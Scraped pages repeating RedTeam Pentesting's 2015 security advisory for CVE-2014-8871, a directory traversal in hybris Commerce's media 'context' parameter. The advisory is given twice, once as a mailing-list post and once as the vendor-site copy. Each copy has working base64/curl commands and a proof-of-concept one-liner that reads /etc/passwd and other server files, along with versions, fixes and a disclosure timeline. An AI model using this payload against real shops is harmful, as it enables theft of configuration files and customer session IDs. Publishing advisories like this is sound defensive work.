=== Content from seclists.org_556db6f5_20250124_214219.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](62)
[By Date](date.html#63)
[![Next](/images/right-icon-16x16.png)](64)

[![Previous](/images/left-icon-16x16.png)](62)
[By Thread](index.html#63)
[![Next](/images/right-icon-16x16.png)](64)

![](/shared/images/nst-icons.svg#search)

# [RT-SA-2014-016] Directory Traversal and Arbitrary File Disclosure in hybris Commerce Software Suite

---

*From*: RedTeam Pentesting GmbH <release () redteam-pentesting de>

*Date*: Wed, 18 Feb 2015 09:10:50 +0100

---

```
Advisory: Directory Traversal and Arbitrary File Disclosure in hybris
          Commerce Software Suite

During a penetration test, RedTeam Pentesting discovered a Directory
Traversal vulnerability in hybris Commerce software suite. This
vulnerability allows attackers to download arbitrary files of any size
from the affected system.

Details
=======

Product: hybris Commerce Software Suite
Affected Versions:
  Release 5.3:   <= 5.3.0.1
  Release 5.2:   <= 5.2.0.3
  Release 5.1.1: <= 5.1.1.2
  Release 5.1:   <= 5.1.0.1
  Release 5.0.4: <= 5.0.4.4
  Release 5.0.3: <= 5.0.3.3
  Release 5.0.0: <= 5.0.0.3
Fixed Versions:
  Release 5.3:      5.3.0.2
  Release 5.2:      5.2.0.4
  Release 5.1.1:    5.1.1.3
  Release 5.1:      5.1.0.2
  Release 5.0.4:    5.0.4.5
  Release 5.0.3:    5.0.3.4
  Release 5.0.0:    5.0.0.4
Vulnerability Type: Directory Traversal, Arbitrary File Disclosure
Security Risk: high
Vendor URL: <http://www.hybris.com/>
Vendor Status: fixed version released
Advisory URL: <https://www.redteam-pentesting.de/advisories/rt-sa-2014-016>
Advisory Status: published
CVE: CVE-2014-8871
CVE URL: <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8871>

Introduction
============

"hybris delivers a commerce software suite that is best in class,
helping a company execute all its direct selling processes and present a
single view and a unified experience to all its customers."

(from the vendor's homepage)

More Details
============

Webshops based on hybris may use an image retrieval system where images
are identified by a URL parameter named "context" rather than a file
name. When this system is used, images can be referenced e.g. like the
following:

<img src="/medias/image.jpg?context=bWFzdGVyfHJvb3R8MTIzNDV8aW1hZ2UvanBl
Z3w3NDE1Njg3MzYxMTcyLmpwZ3xlM2IwYzQ0Mjk4ZmMxYzE0OWFmYmY0Yzg5OTZmYjkyNDI3
YWU0MWU0NjQ5YjkzNGNhNDk1OTkxYjc4NTJiODU1" alt="[...]" width="200" />

Changing the file name part of the URL from "image.jpg" to e.g.
"redteam.jpg" reveals that not the file name part of the URL, but the
value of the parameter "context" is used to select the desired file.

A closer look at the parameter shows that its value is encoded as
Base64. Decoding it reveals a pipe-separated data structure which
includes a file size (third value), a file name (fifth value) and a
SHA-256 hash (sixth value):

$ echo -n "bWFzdGVyfHJvb3R8MTIzNDV8aW1hZ2UvanBlZ3w3NDE1Njg3MzYxMTcyLmpw\
Z3xlM2IwYzQ0Mjk4ZmMxYzE0OWFmYmY0Yzg5OTZmYjkyNDI3YWU0MWU0NjQ5YjkzNGNhNDk\
1OTkxYjc4NTJiODU1" | base64 -d

master|root|12345|image/jpeg|7415687361172.jpg|e3b0c44298fc1c149afbf4c89
96fb92427ae41e4649b934ca495991b7852b855

During the penetration test many parameters were inspected and it turned
out that the SHA-256 hash is used to reference a particular version of
the file, and can be replaced by a dash ("-") character, which always
returns the latest version. The example request can be modified and
requested with curl as follows:

$ echo -n "master|root|12345|image/jpeg|7415687361172.jpg|-" | base64
bWFzdGVyfHJvb3R8MTIzNDV8aW1hZ2UvanBlZ3w3NDE1Njg3MzYxMTcyLmpwZ3wt
$ curl -I <http://www.example.com/medias/redteam?context=bWFzdGVyfHJvb3R\>
8MTIzNDV8aW1hZ2UvanBlZ3w3NDE1Njg3MzYxMTcyLmpwZ3wt

It was verified that the file name (fifth) value is vulnerable to
directory traversal. This enables attackers to retrieve the contents of
other files from the server's filesystem by using sequences of "../".
The following HTTP request for example delivers the contents of the file
"/etc/passwd":

$ echo -n "master|root|12345|text/plain|../../../../../../etc/passwd|-"\
  | base64 -w0
bWFzdGVyfHJvb3R8MTIzNDV8dGV4dC9wbGFpbnwuLi8uLi8uLi8uLi8uLi8uLi9ldGMvcGFz
c3dkfC0=

$ curl <http://www.example.com/medias/redteam?context=bWFzdGVyfHJvb3R8MT\>
IzNDV8dGV4dC9wbGFpbnwuLi8uLi8uLi8uLi8uLi8uLi9ldGMvcGFzc3dkfC0

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
[...]

The size included in the third field of the data structure is used to
limit the number of bytes returned for a file. As it can be modified by
attackers, files of any size with arbitrary content can be downloaded,
provided the path to the file on the server is known. This enables
attackers to read, among others, the environment of the current process
at /proc/self/environ and the list of memory maps including the full
paths to loaded libraries at /proc/self/maps. This way, knowledge about
a particular instance of hybris can be gathered. Afterwards it is
possible to access configuration files like "local.properties" and the
log files for shop orders which also contain the current session-IDs of
users. Furthermore, the Java bytecode of hybris can be downloaded and
decompiled.

Proof of Concept
================

------------------------------------------------------------------------
FILENAME=/etc/passwd
curl <https://www.example.com/medias/redteam?context=$>(base64 -w0 <<< \
"master|root|200000000|text/plain|../../../../../..${FILENAME}|-")
------------------------------------------------------------------------

Workaround
==========

Implement a new filter which validates file names and insert this filter
before hybris' own MediaFilter. The new filter should return an error
when a file outside the media directory is requested.

Fix
===

Upgrade to a fixed hybris version or apply the vendor's hot fix.

Security Risk
=============

This vulnerability can be used to download files from the file system of
the server. This includes, among others, configuration files and the
hybris order logfile, which contains sensitive data. Therefore, the
vulnerability poses a high risk.

Timeline
========

2014-10-08 Vulnerability identified
2014-10-08 Customer notified vendor
2014-10-29 Vendor released fixed version
2014-11-11 CVE number requested
2014-11-12 Vendor requests more time to notify their customers
2014-11-14 CVE number assigned
2014-12-08 Vendor again requests more time to notify customers
2015-01-12 Vendor notifies customers again, agrees to release advisory
           on 2015-02-18
2015-02-17 Vendor requests more time to notify customers for the 3rd
           time, RedTeam Pentesting declines
2015-02-18 Advisory released

RedTeam Pentesting GmbH
=======================

RedTeam Pentesting offers individual penetration tests, short pentests,
performed by a team of specialised IT-security experts. Hereby, security
weaknesses in company networks or products are uncovered and can be
fixed immediately.

As there are only few experts in this field, RedTeam Pentesting wants to
share its knowledge and enhance the public knowledge with research in
security-related areas. The results are made available as public
security advisories.

More information about RedTeam Pentesting can be found at
<https://www.redteam-pentesting.de>.

--
RedTeam Pentesting GmbH                   Tel.: +49 241 510081-0
Dennewartstr. 25-27                       Fax : +49 241 510081-99
52068 Aachen                    <https://www.redteam-pentesting.de>
Germany                         Registergericht: Aachen HRB 14004
Geschäftsführer:                       Patrick Hof, Jens Liebchen

```

**Attachment:
[signature.asc](att-63/signature_asc.bin)**

*Description:* Digital signature

```

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](62)
[By Date](date.html#63)
[![Next](/images/right-icon-16x16.png)](64)

[![Previous](/images/left-icon-16x16.png)](62)
[By Thread](index.html#63)
[![Next](/images/right-icon-16x16.png)](64)

### Current thread:

* **[RT-SA-2014-016] Directory Traversal and Arbitrary File Disclosure in hybris Commerce Software Suite** *RedTeam Pentesting GmbH (Feb 18)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from packetstormsecurity.com_9da0d199_20250124_214217.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from www.redteam-pentesting.de_957bab43_20250126_034252.html ===
+49 241 510081-0kontakt@redteam-pentesting.de[DE](/de/advisories/rt-sa-2014-016/)[![RedTeam Pentesting Logo](/img/redteam-logo_hub5a66d245245ce30f53b50d2b4dfb31b_19123_120x0_resize_q100_h2_box_3.webp)](/)[DE](/de/advisories/rt-sa-2014-016/ "Deutsche Version")

* Company
  Company
  + [About us](/en/redteam/)
  + [History](/en/redteam/history/)
  + [Press](/en/press/)
  + [News Archive](/en/archive/)
* Pentest
  Pentest
  + [Definition](/en/pentest/)
  + [Types of Tests](/en/pentest/types/)
  + [Workflow](/en/pentest/workflow/)
  + [FAQ](/en/faq/)
* Publications
  Publications
  + [Overview](/en/publications/)
  + [Advisories](/en/advisories/)
  + [Talks](/en/talks/)
  + [Other Publications](/en/publications-other/)
* [Career](https://jobs.redteam-pentesting.de/)
* [Blog](https://blog.redteam-pentesting.de/)
* [Contact](#contactform)

Contact

Contact us

+49 241 510081-0kontakt@redteam-pentesting.de[Contact form](#contactform)JavaScript is not enabled in your browser. Please consider that some functions might not be available for you.![RedTeam Pentesting Header](/img/header/hl_header-1_hu0f2d230fb5185511a90e67c2e597c0b5_900546_1000x0_resize_q100_h2_box.webp)![RedTeam Pentesting Header](/img/header/hl_header-2_hub774373357e916cb041b4943299d8717_1132770_1000x0_resize_q100_h2_box.webp)![RedTeam Pentesting Header](/img/header/hl_header-3_hub8fc12cb70b2021e589c6810b4b53d04_895916_1000x0_resize_q100_h2_box.webp)![RedTeam Pentesting Header](/img/header/hl_header-4_hu27d71f64bf1f030161a23c2dcd666f59_1015002_1000x0_resize_q100_h2_box.webp)![RedTeam Pentesting Header](/img/header/hl_header-5_hud32f8d698ff23308f4d8b8566aae5928_933115_1000x0_resize_q100_h2_box.webp)![RedTeam Pentesting Header](/img/header/hl_header-6_hu1bc03534cd122894ef676fff89833ac5_1144618_1000x0_resize_q100_h2_box.webp)![RedTeam Pentesting Header](/img/header/hl_header-7_hu91e55bd77169043ae9e542f1b5f8f2f4_1354043_1000x0_resize_q100_h2_box.webp)![RedTeam Pentesting Header](/img/header/hl_header-8_hu155130647c165410f2ffa35227549138_1321813_1000x0_resize_q100_h2_box.webp)[newer](https://www.redteam-pentesting.de/en/advisories/rt-sa-2015-001/)[back to overview](/en/advisories)[older](https://www.redteam-pentesting.de/en/advisories/rt-sa-2014-015/)

[Text Version](/en/advisories/rt-sa-2014-016.txt)

## Directory Traversal and Arbitrary File Disclosure in hybris Commerce Software Suite

During a penetration test, RedTeam Pentesting discovered a Directory
Traversal vulnerability in hybris Commerce software suite. This
vulnerability allows attackers to download arbitrary files of any size
from the affected system.

### Details

* Product: hybris Commerce Software Suite
* Affected Versions:
  + Release 5.3: <= 5.3.0.1
  + Release 5.2: <= 5.2.0.3
  + Release 5.1.1: <= 5.1.1.2
  + Release 5.1: <= 5.1.0.1
  + Release 5.0.4: <= 5.0.4.4
  + Release 5.0.3: <= 5.0.3.3
  + Release 5.0.0: <= 5.0.0.3
* Fixed Versions:
  + Release 5.3: 5.3.0.2
  + Release 5.2: 5.2.0.4
  + Release 5.1.1: 5.1.1.3
  + Release 5.1: 5.1.0.2
  + Release 5.0.4: 5.0.4.5
  + Release 5.0.3: 5.0.3.4
  + Release 5.0.0: 5.0.0.4
* Vulnerability Type: Directory Traversal, Arbitrary File Disclosure
* Security Risk: high
* Vendor URL: `http://www.hybris.com/`
* Vendor Status: fixed version released
* Advisory URL: `https://www.redteam-pentesting.de/advisories/rt-sa-2014-016`
* Advisory Status: published
* CVE: CVE-2014-8871
* CVE URL: `https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8871`

### Introduction

“hybris delivers a commerce software suite that is best in class,
helping a company execute all its direct selling processes and present a
single view and a unified experience to all its customers.”

(from the vendor’s homepage)

### More Details

Webshops based on hybris may use an image retrieval system where images
are identified by a URL parameter named “context” rather than a file
name. When this system is used, images can be referenced e.g. like the
following:

```
<img src="/medias/image.jpg?context=bWFzdGVyfHJvb3R8MTIzNDV8aW1hZ2UvanBl
Z3w3NDE1Njg3MzYxMTcyLmpwZ3xlM2IwYzQ0Mjk4ZmMxYzE0OWFmYmY0Yzg5OTZmYjkyNDI3
YWU0MWU0NjQ5YjkzNGNhNDk1OTkxYjc4NTJiODU1" alt="[...]" width="200" />

```

Changing the file name part of the URL from “image.jpg” to e.g.
“redteam.jpg” reveals that not the file name part of the URL, but the
value of the parameter “context” is used to select the desired file.

A closer look at the parameter shows that its value is encoded as
Base64. Decoding it reveals a pipe-separated data structure which
includes a file size (third value), a file name (fifth value) and a
SHA-256 hash (sixth value):

```
$ echo -n "bWFzdGVyfHJvb3R8MTIzNDV8aW1hZ2UvanBlZ3w3NDE1Njg3MzYxMTcyLmpw\
Z3xlM2IwYzQ0Mjk4ZmMxYzE0OWFmYmY0Yzg5OTZmYjkyNDI3YWU0MWU0NjQ5YjkzNGNhNDk\
1OTkxYjc4NTJiODU1" | base64 -d

master|root|12345|image/jpeg|7415687361172.jpg|e3b0c44298fc1c149afbf4c89
96fb92427ae41e4649b934ca495991b7852b855

```

During the penetration test many parameters were inspected and it turned
out that the SHA-256 hash is used to reference a particular version of
the file, and can be replaced by a dash ("-") character, which always
returns the latest version. The example request can be modified and
requested with curl as follows:

```
$ echo -n "master|root|12345|image/jpeg|7415687361172.jpg|-" | base64
bWFzdGVyfHJvb3R8MTIzNDV8aW1hZ2UvanBlZ3w3NDE1Njg3MzYxMTcyLmpwZ3wt
$ curl -I http://www.example.com/medias/redteam?context=bWFzdGVyfHJvb3R\
8MTIzNDV8aW1hZ2UvanBlZ3w3NDE1Njg3MzYxMTcyLmpwZ3wt

```

It was verified that the file name (fifth) value is vulnerable to
directory traversal. This enables attackers to retrieve the contents of
other files from the server’s filesystem by using sequences of “../”.
The following HTTP request for example delivers the contents of the file
“/etc/passwd”:

```
$ echo -n "master|root|12345|text/plain|../../../../../../etc/passwd|-"\
  | base64 -w0
bWFzdGVyfHJvb3R8MTIzNDV8dGV4dC9wbGFpbnwuLi8uLi8uLi8uLi8uLi8uLi9ldGMvcGFz
c3dkfC0=

$ curl http://www.example.com/medias/redteam?context=bWFzdGVyfHJvb3R8MT\
IzNDV8dGV4dC9wbGFpbnwuLi8uLi8uLi8uLi8uLi8uLi9ldGMvcGFzc3dkfC0

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
[...]

```

The size included in the third field of the data structure is used to
limit the number of bytes returned for a file. As it can be modified by
attackers, files of any size with arbitrary content can be downloaded,
provided the path to the file on the server is known. This enables
attackers to read, among others, the environment of the current process
at /proc/self/environ and the list of memory maps including the full
paths to loaded libraries at /proc/self/maps. This way, knowledge about
a particular instance of hybris can be gathered. Afterwards it is
possible to access configuration files like “local.properties” and the
log files for shop orders which also contain the current session-IDs of
users. Furthermore, the Java bytecode of hybris can be downloaded and
decompiled.

### Proof of Concept

```
FILENAME=/etc/passwd
curl https://www.example.com/medias/redteam?context=$(base64 -w0 <<< \
"master|root|200000000|text/plain|../../../../../..${FILENAME}|-")

```
### Workaround

Implement a new filter which validates file names and insert this filter
before hybris’ own MediaFilter. The new filter should return an error
when a file outside the media directory is requested.

### Fix

Upgrade to a fixed hybris version or apply the vendor’s hot fix.

### Security Risk

This vulnerability can be used to download files from the file system of
the server. This includes, among others, configuration files and the
hybris order logfile, which contains sensitive data. Therefore, the
vulnerability poses a high risk.

### Timeline

* 2014-10-08 Vulnerability identified
* 2014-10-08 Customer notified vendor
* 2014-10-29 Vendor released fixed version
* 2014-11-11 CVE number requested
* 2014-11-12 Vendor requests more time to notify their customers
* 2014-11-14 CVE number assigned
* 2014-12-08 Vendor again requests more time to notify customers
* 2015-01-12 Vendor notifies customers again, agrees to release advisory
  on 2015-02-18
* 2015-02-17 Vendor requests more time to notify customers for the 3rd
  time, RedTeam Pentesting declines
* 2015-02-18 Advisory released

### RedTeam Pentesting GmbH

RedTeam Pentesting offers individual penetration tests, short pentests,
performed by a team of specialised IT-security experts. Hereby, security
weaknesses in company networks or products are uncovered and can be
fixed immediately.

As there are only few experts in this field, RedTeam Pentesting wants to
share its knowledge and enhance the public knowledge with research in
security-related areas. The results are made available as public
security advisories.

More information about RedTeam Pentesting can be found at
<https://www.redteam-pentesting.de>.

# Contact us

We are happy to advise you and answer your questions.Contact dataPhone: +49 241 510081-0
Email: kontakt@redteam-pentesting.de
([GnuPG/PGP public key](/gpg/RedTeam-Pentesting-GPG-Kontakt-Key.asc))Visit and Postal AddressRedTeam Pentesting GmbH
Alter Posthof 1
52062 AachenEmployees of RedTeam Pentesting may be contacted directly at
firstname.lastname@redteam-pentesting.de:
([GnuPG/PGP public keys](/gpg/RedTeam-Pentesting-GPG-All-Keys.asc))Contact formâ![CAPTCHA]()
I agree to the transmission and processing of my data to RedTeam Pentesting according to RedTeam Pentesting’s [privacy policy](/en/imprint/privacy).
Company

* [About us](/en/redteam/)
* [History](/en/redteam/history/)
* [Press](/en/press/)
* [News Archive](/en/archive/)
Pentest

* [Definition](/en/pentest/)
* [Types of Tests](/en/pentest/types/)
* [Workflow](/en/pentest/workflow/)
* [FAQ](/en/faq/)
Publications

* [Overview](/en/publications/)
* [Advisories](/en/advisories/)
* [Talks](/en/talks/)
* [Other Publications](/en/publications-other/)
[Career](https://jobs.redteam-pentesting.de/)[Blog](https://blog.redteam-pentesting.de/)[Contact](#contactform)[Imprint](/en/imprint/) |
[Privacy Policy](/en/imprint/privacy/)
